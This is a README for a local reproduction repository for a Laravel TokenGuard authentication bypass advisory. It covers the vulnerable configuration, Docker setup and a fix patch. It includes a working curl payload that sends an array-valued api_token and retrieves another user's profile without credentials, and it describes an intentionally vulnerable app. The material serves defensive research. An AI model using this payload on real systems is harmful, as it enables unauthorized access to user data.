# Laravel TokenGuard Authentication Bypass (GHSA-f9x3-7vq9-cph6)

[日本語](README.ja.md) · [Detailed analysis](docs/analysis.md)

**An attacker without a valid token may be able to bypass API authentication and retrieve another user’s information.** This issue affects Laravel's legacy token authentication guard, `Illuminate\Auth\TokenGuard` ([GHSA-f9x3-7vq9-cph6](https://github.com/laravel/framework/security/advisories/GHSA-f9x3-7vq9-cph6)).

Start by checking your app's `config/auth.php`. If a guard uses `'driver' => 'token'` and protects your API routes, and `hash` is `false` or omitted, and the app uses Eloquent with MySQL/MariaDB, treat it as vulnerable.

**The vulnerable combination, in short:**

| Condition | Value |
|-|-|
| `hash` | `false` (or omitted) |
| `api_token` | stored on some user row (not `null`) |
| Patch | not registered |

This repository ships in exactly that state by default.

On Laravel 5.6–10.x, `composer audit` or Dependabot may not report this issue. Check your configuration even if neither tool reports it.

This repository provides reproductions for Laravel `v5.6.40` and `v8.5.0` so you can observe the issue and verify the fix.

## Running this repository

This is a legacy Laravel 8.5 app (PHP 7.4, MySQL), so it ships with its own `docker-compose.yml` rather than Sail's defaults.

```bash
cp .env.example .env
docker compose build
docker compose up -d
docker compose exec -u sail laravel.test composer install --prefer-dist --no-interaction
docker compose exec -u sail laravel.test php artisan key:generate
docker compose exec -u sail laravel.test php artisan migrate --seed
```

This seeds a demo user (`demo@example.com` / `password`) alongside 9 random users. The app is now at `http://localhost:8000` (change `APP_PORT` in `.env` if 8000 is taken).

### The bypass, in one request

No patch is registered by default, and `guards.api.hash` is omitted by default in `config/auth.php` — older `TokenGuard` treats a missing `hash` as `false`, the vulnerable configuration this issue is about. The seeder also gives the demo user a fixed `api_token` (`sha256('fixed-demo-seed')`) chosen so MySQL's string-to-number coercion reads it as `0`. So straight after seeding, with no login, no token, and no password:

```bash
curl -i -X GET http://localhost:8000/api/user --json '{"api_token":[0]}'
```

This returns **HTTP 200** with the demo user's full profile. `--json` (curl 7.82+) sets `Content-Type`/`Accept` to `application/json` and sends the body, but it also implies `-X POST`, so `-X GET` must come after it to keep the route's method (otherwise you get HTTP 405). On older curl, spell it out:

```bash
curl -i -X GET http://localhost:8000/api/user \
  -H 'Content-Type: application/json' -H 'Accept: application/json' \
  -d '{"api_token":[0]}'
```

### ✅ Apply the fix and confirm it works

This repository already depends on [`cweagans/composer-patches`](https://github.com/cweagans/composer-patches), a Composer plugin that applies patches listed under `extra.patches` whenever the target package is installed — so edits survive a fresh `composer install` instead of being lost like a hand-edited `vendor/`.

Register [`patches/tokenguard-is-string-fix.patch`](patches/tokenguard-is-string-fix.patch) under `extra.patches.laravel/framework` in `composer.json`:

```diff
     "extra": {
         "laravel": {
             "dont-discover": []
-        }
+        },
+        "patches": {
+            "laravel/framework": {
+                "GHSA-f9x3-7vq9-cph6: TokenGuard array-token bypass fix": "patches/tokenguard-is-string-fix.patch"
+            }
+        }
     },
```

Then reinstall the framework and clear the configuration cache:

```bash
docker compose exec -u sail laravel.test composer reinstall laravel/framework --prefer-dist --no-interaction
docker compose exec -u sail laravel.test php artisan config:clear
```

If `composer reinstall` reports "Package is not installed", run `composer install --prefer-dist --no-interaction` once first, then retry the `reinstall`. The same two commands, run again after removing the `extra.patches` entry, put the app back in its default **unpatched** state.

### Tear down

Stop and remove everything with `docker compose down -v` (the `-v` also removes the MySQL data volume).

## About this repository

A Laravel 8.5 application (the last skeleton that scaffolds the `token` guard) kept for local reproduction. Branches: `main` and `laravel-8.5` (8.5.0), `laravel-5.6` (5.6.40, the first affected version).

> [!WARNING]
> **Local security research and education only. Never deploy this or expose it to the internet.** Its authentication setup is intentionally insecure. Use disposable data and systems you own or are authorized to test.
>
> **No patch is registered by default, and `guards.api.hash` is omitted by default** (treated as `false`). The app runs the unpatched `TokenGuard::user()` as-is, and the demo user's seeded token is chosen to make the bypass reproduce deterministically, so the vulnerable behavior described above is live out of the box. Registering the real fix patch is covered in the [analysis](docs/analysis.md#how-this-repository-manages-patches).

## Learn more

[**Detailed analysis**](docs/analysis.md): root cause, observed results with `hash` true/false, how far back it goes (5.5 is not affected, 5.6 is the first affected version), support-policy coverage, and the scanner gap in detail.

## References

* [GitHub Security Advisory — GHSA-f9x3-7vq9-cph6](https://github.com/laravel/framework/security/advisories/GHSA-f9x3-7vq9-cph6)
* [Laravel 8.5.0 `TokenGuard.php`](https://github.com/laravel/framework/blob/v8.5.0/src/Illuminate/Auth/TokenGuard.php)
* [Laravel 8.5.0 `EloquentUserProvider.php`](https://github.com/laravel/framework/blob/v8.5.0/src/Illuminate/Auth/EloquentUserProvider.php)
* [Laravel 11.56.1 `TokenGuard.php` (patched)](https://github.com/laravel/framework/blob/v11.56.1/src/Illuminate/Auth/TokenGuard.php)
* [Laravel support policy](https://github.com/laravel/docs/blob/13.x/releases.md#support-policy)
